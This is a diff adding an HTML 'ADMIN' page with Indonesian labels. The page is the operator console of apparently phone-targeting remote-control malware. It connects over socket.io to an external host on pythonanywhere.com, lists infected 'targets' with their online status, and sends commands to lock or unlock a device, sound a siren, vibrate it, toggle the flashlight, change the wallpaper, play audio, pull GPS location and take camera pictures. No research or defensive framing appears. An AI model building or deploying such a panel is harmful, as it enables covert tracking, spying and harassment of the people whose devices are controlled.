@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="id">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>ADMIN</title>
+<style>body{background:#0a0a0a;color:#fff;font-family:Arial;padding:14px}h2{color:#e74c3c}button{padding:14px;margin:6px;border:none;border-radius:8px;font-weight:bold;font-size:14px;cursor:pointer;width:100%}.r{background:#c0392b;color:#fff}.g{background:#27ae60;color:#fff}.gr{background:#333;color:#ccc}.t{border:1px solid #333;padding:10px;margin:4px 0;border-radius:8px;cursor:pointer;font-size:12px}.t.a{border-color:#e74c3c;background:#1a0000}.dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px}.l{background:#2ecc71}.d{background:#e74c3c}</style></head>
+<body>
+<h2>🔴 ADMIN</h2>
+<button class="g" onclick="connect()">🔗 SAMBUNG</button>
+<p id="status">Terputus</p>
+<div id="targets"><p style="color:#888">Menunggu...</p></div>
+<button class="r" onclick="send('lock')">🔒 KUNCI</button>
+<button class="gr" onclick="send('unlock')">🔓 LEPAS</button>
+<button class="r" onclick="send('siren')">🔊 ALARM</button>
+<button class="gr" onclick="send('vibrate')">📳 GETAR</button>
+<button class="r" onclick="send('flash_on')">💡 SENTER</button>
+<button class="gr" onclick="send('flash_off')">🌑 MATI</button>
+<button class="r" onclick="send('wallpaper')">🖼 WALLPAPER</button>
+<button class="gr" onclick="send('mp3')">🎵 MP3</button>
+<button class="r" onclick="send('gps')">📍 GPS</button>
+<button class="gr" onclick="send('camera')">📸 KAMERA</button>
+<script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
+<script>
+var s,ct=null,all=[];
+function connect(){
+    s=io('https://wafii.pythonanywhere.com',{query:{role:'admin'}});
+    document.getElementById('status').innerHTML='<span class="dot l"></span> Tersambung';
+    s.on('targets',function(d){all=d;render()});
+}
+function render(){var el=document.getElementById('targets');if(all.length===0){el.innerHTML='<p style="color:#888">Tidak ada target</p>';return}el.innerHTML=all.map(function(t){return'<div class="t'+(ct===t.id?' a':'')+'" onclick="select(\''+t.id+'\')"><span class="dot '+(t.online?'l':'d')+'"></span><b>'+t.id+'</b></div>'}).join('')}
+function select(id){ct=id;render()}
+function send(cmd){if(!s||!ct){alert('Pilih target!');return}s.emit('command',{targetId:ct,cmd:cmd})}
+</script></body></html>
